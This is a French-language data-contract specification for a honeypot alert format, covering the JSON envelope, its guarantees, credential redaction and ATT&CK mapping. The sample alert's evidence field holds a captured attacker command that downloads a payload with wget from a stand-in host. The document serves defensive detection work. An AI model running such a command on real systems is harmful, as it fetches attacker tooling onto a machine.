# Contrat de données — alerte CyberDNA

À l'issue de la détection ML, toute alerte confirmée est représentée par une
enveloppe JSON `CyberDNAAlert`, versionnée (`schema_version: "1.0"`). Elle est
créée avant toute écriture Neo4j et est stockée dans le document Elasticsearch
sous `analysis.cyberdna_alert`. L'étape 4 consommera exactement cette enveloppe.

## Garanties

- `alert_id` et `action.event_id` sont déterministes : rejouer le même événement
  ne crée pas une nouvelle identité logique.
- L'adresse IP source, la cible/honeypot, le service (port/protocole), l'action
  observée, le verdict ML et les techniques ATT&CK sont présents dans une seule
  structure.
- `correlation.correlation_key` associe les actions d'une même IP contre le
  même actif (`<source_ip>:honeypot:<nom>`). Ce n'est pas une attribution à une
  personne ou à un groupe APT.
- Les mots de passe, jetons et identifiants présents dans les preuves sont
  remplacés par `<redacted>` avant archivage dans le contrat.

## Structure canonique

```json
{
  "schema_version": "1.0",
  "alert_id": "alert-...",
  "generated_at": "2026-08-18T10:00:00+00:00",
  "detection": {
    "is_alert": true,
    "status": "ATTACK DETECTED",
    "risk_score": 85.0,
    "detector": "IsolationForest",
    "reasons": ["anomalie statistique (Isolation Forest)"],
    "feature_snapshot": {"total_events": 12.0}
  },
  "action": {
    "event_id": "evt-...",
    "timestamp": "2026-08-18T10:00:00+00:00",
    "honeypot": "cowrie",
    "event_type": "cowrie.command.input",
    "source": {"ip": "203.0.113.10"},
    "target": {
      "asset_id": "honeypot:cowrie",
      "honeypot": "cowrie",
      "endpoint": {"port": 22, "protocol": "ssh"},
      "service_name": "ssh/22"
    },
    "evidence": {"input": "wget http://example.invalid/payload"}
  },
  "mitre_techniques": [{"technique_id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command And Control"}],
  "correlation": {"correlation_key": "203.0.113.10:honeypot:cowrie"}
}
```

Les champs optionnels inconnus (IP de destination, technique ATT&CK) restent
absents ou vides ; ils ne sont jamais inventés. Les formats fournisseurs restent
dans le log brut Elasticsearch : ce contrat est leur représentation canonique.
